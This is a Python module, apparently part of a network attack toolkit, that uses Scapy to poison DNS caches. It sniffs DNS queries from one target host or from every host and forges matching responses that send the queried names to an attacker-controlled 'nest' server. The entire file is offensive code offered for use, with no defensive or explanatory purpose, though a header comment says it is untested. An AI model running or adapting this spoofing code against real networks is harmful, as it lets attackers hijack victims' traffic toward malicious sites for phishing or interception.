#!/usr/bin/python

# Author: Tristan Strathearn
# Website: www.r3oath.com
# Email: r3oath@gmail.com

# Licensed under Creative Commons Attribution-ShareAlike 3.0 Unported (CC BY-SA 3.0)
# See the full license at http://creativecommons.org/licenses/by-sa/3.0/legalcode

# ----------------------------------------------------------------------
# NOTE THIS MODULE HAS NOT BEEN TESTED YET. IT MAY NOT WORK AS EXPECTED.
# ----------------------------------------------------------------------

import E4
from scapy.all import *

class Dns():
    """Handles DNS attacks and processing."""
    def __init__(self):
        pass

    def poisonHost(self, packet, host, nest):
        """Poison a specific host's DNS cache.

        Keyword Arguments:
        packet -- The DNS packet to use as a template.
        host -- The host NetworkObject to poison.
        nest -- The machine NetworkObject that will be serving the web content.

        """
        if self.isDns(packet) == False:
            return
        if self.isResponse(packet) == True:
            return
        if packet.source().getIP() != host.getIP():
            return

        self.sendPoison(packet, packet.source(), nest)

    def poisonAll(self, packet, nest):
        """Poison all host's DNS cache's.

        Keyword Arguments:
        packet -- The DNS packet to use as a template.
        nest -- The NetworkObject that will be serving the web content.

        """
        if self.isDns(packet) == False:
            return
        if self.isResponse(packet) == True:
            return

        self.sendPoison(packet, packet.source(), nest)

    def isDns(self, packet):
        """Check if the specified packet is a DNS packet.

        Keyword Arguments:
        packet -- The packet to check.

        """
        return True if DNS in packet.scapyPacket() else False

    def isResponse(self, packet):
        """Check if the specified packet is a DNS response.

        Keyword Arguments:
        packet -- The packet to check.

        """
        return True if DNSRR in packet.scapyPacket() else False

    def sendPoison(self, packet, host, nest):
        """Send a poison packet.

        Keyword Arguments:
        packet -- The packet to use as a template. Needs to be a DNS query.
        host -- The host NetworkObject to send poisoned DNS response too.
        nest -- The NetworkObject that will be serving the web content.

        """
        # Create the various packet parts.
        _Ether = Ether(src=packet.destination().mac, dst=packet.source().mac)
        _IP = IP(src=packet.destination().ip, dst=packet.source().ip)
        _UDP = UDP(sport=packet.destination().port, dport=packet.source().port)
        _DNS = DNS(id=packet.scapyPacket()[DNS].id)
        _DNSQR = packet.scapyPacket()[DNSQR]
        _DNSRR = DNSRR(rrname=packet.scapyPacket()[DNSQR].qname, rdata=nest.ip)

        # Populate the DNS portion.
        _DNS.qd = _DNSQR
        _DNS.an = _DNSRR

        # Create the final packet.
        dnsPacket = _Ether/_IP/_UDP/_DNS

        # GO GO GO!
        sendp(dnsPacket, verbose=0)